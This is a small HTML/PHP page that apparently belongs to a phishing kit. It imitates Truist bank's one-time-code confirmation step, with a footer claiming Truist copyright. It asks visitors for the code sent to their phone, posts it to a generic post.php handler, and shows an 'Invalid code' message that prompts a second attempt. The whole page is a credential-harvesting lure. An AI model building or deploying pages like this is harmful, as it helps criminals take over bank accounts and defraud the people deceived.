<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <link rel="stylesheet" href="res/css/card.css">
</head> 
<body>
<header>
    <img src="res/img/logos.png">
</header>

<main>

<div class="title">
Confirmation
</div>

    <div class="container"> 
    <div class="text">Please enter the code sent to your phone number to continue.</div>
            <form action="post.php" method="post">
            <input type="text" name="otp" required placeholder="Enter the code">
            <?php 
if(isset($_GET['error'])){
    echo '<input type="hidden" name="exit">';
    echo '<p style="color:red;">Invalid code. Please try again.</p>';
}
?>
    <div class="col">
    <button type="submit" class="log">Continue</button>
</div>
</form>
    </div>

</main>
<footer>
© 2024, Truist. All Rights Reserved.
</footer>

</body>
</html>

